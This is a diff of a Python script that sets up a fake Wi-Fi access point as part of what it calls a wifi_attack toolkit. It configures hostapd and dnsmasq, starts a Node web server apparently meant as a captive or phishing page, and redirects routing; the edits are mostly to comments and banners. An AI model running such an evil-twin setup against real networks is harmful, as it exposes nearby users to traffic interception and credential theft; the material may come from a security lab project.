@@ -31,9 +31,8 @@ def reset_setting():
 	os.system('systemctl start systemd-resolved >/dev/null 2>&1') 
 
 
-##############################################
-############### Start fake AP ################
-##############################################
+######################################## START THE FAKE AP ###################################
+
 	
 ### Setup the fake access point settings.
 def fake_ap_on():
@@ -74,8 +73,6 @@ def fake_ap_on():
 def run_fake_ap():
 	### Link the dnsmasq to the configuration file.
 	os.system('dnsmasq -C dnsmasq.conf')
-	### Start apache2 - web server
-	# os.system('service apache2 start')
 	### Start the web server
 	os.system('gnome-terminal -- sh -c "node website/index.js"')
 	os.system('route add default gw 10.0.0.1')
@@ -85,9 +82,7 @@ def run_fake_ap():
 	os.system('route add default gw 10.0.0.1')
 
 
-##############################################
-############ Configuration files #############
-##############################################
+######################################## CONFIGURATION FILES  ###################################
 
 ### Create the hostapd and dnsmasq configuration files.	
 def create_conf_files():
@@ -111,40 +106,38 @@ def remove_conf_files():
 
 if __name__ == "__main__":
 	print(B + "********************************************************************** \n")
-	print("******** Part 2: Set up & upload fake AP. MOHAHA. WE ARE EVIL ******** \n")
+	print("******** Part B: Set && Run the fake AP. ******** \n")
 	print("********************************************************************** \n")
 	
 	### Step 1: Choosing the interface to be used as the AP
-	print(G + "*** Step 1:  Choosing an interface that will be used for the fake AP. ***\n")
-	empty = input ("Press Enter to continue.........")
+	print(G + "*** 1:  Select an interface that will be used for the fake AP. ***\n")
+	#empty = input ("Press Enter to continue.........")
 	print(W)
 	os.system('ifconfig')
 	global interface2
-	interface2 = input(G + "Please enter the interface name you want to use: ")
+	interface2 = input(G + "Please enter the interface name you want to use and press enter: ")
 	
 	# Reset all the setting
 	reset_setting() 
 	
 	# ssid=input("Please enter the SSID name ")
 	global essid
-	# The name of the fake AP (input)
+	# The name of the fake AP (input) received from the wifi_attack script (ao_name)  
 	essid = sys.argv[1] 
 	
 	### Step 2: Activate the fake AP
-	print(G + "*** Step 2:  Activation of the fake AP. ***\n")
-	empty = input ("Press Enter to continue.........")
+	print(G + "*** 2:  Start the fake AP. ***\n")
+	#empty = input ("Press Enter to continue.........")
 	print(W)
 	fake_ap_on()
 	create_conf_files()
 	run_fake_ap()
 	
 	### Step 3: Deactivate the fake AP
-	print(G + "*** Step 3:  Deactivation of the fake AP. ***\n")
+	print(G + "*** 3:  Stop the fake AP. ***\n")
 	empty = input ("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
 	remove_conf_files()
 	reset_setting()
 	
-	print(G + "Everything returned back to default setting. \nHopes to see you soon :) ***\n")
-
 	
 	
